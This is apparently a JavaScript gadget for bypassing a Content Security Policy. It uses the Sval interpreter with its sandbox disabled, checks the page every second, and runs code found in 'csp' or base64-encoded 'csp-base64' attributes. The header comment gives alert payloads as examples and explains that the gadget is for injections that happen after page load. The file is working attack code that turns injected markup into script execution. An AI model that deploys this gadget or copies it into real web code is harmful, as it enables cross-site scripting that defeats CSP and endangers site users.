/*
	Classic scenario but where the injection happen afterwards.
	Condition needed: unsafe-eval

	This will look for any element with the attribute CSP and evaluate it. 
	!!! Do not forger to set window.kill to true after your injection  !!!

	Example:
	- <a csp="alert(1)"></a>
	- <a csp-base64="YWxlcnQoJzInKQ=="></a>
*/

// Trigger only onload, there is another scenario in case the injection happend afterwards
import Sval from 'sval'

const options = {
  ecmaVer: 9,
  sandBox: false,
}

const interpreter = new Sval(options)

window.kill = false;
sadafzadfcvsfzdfzadfzadfsqv = () => {
	let payloads = document.querySelectorAll('[csp]');
	for (let payload of payloads) {
	  interpreter.run(payload.attributes['csp'].value)
	}

	// Base 64 encoded version
	payloads = document.querySelectorAll('[csp-base64]');
	for (let payload of payloads) {
	  interpreter.run(atob(payload.attributes['csp-base64'].value))
	}
	if (!window.kill) setTimeout(sadafzadfcvsfzdfzadfzadfsqv, 1000);
}

setTimeout(sadafzadfcvsfzdfzadfzadfsqv, 1000);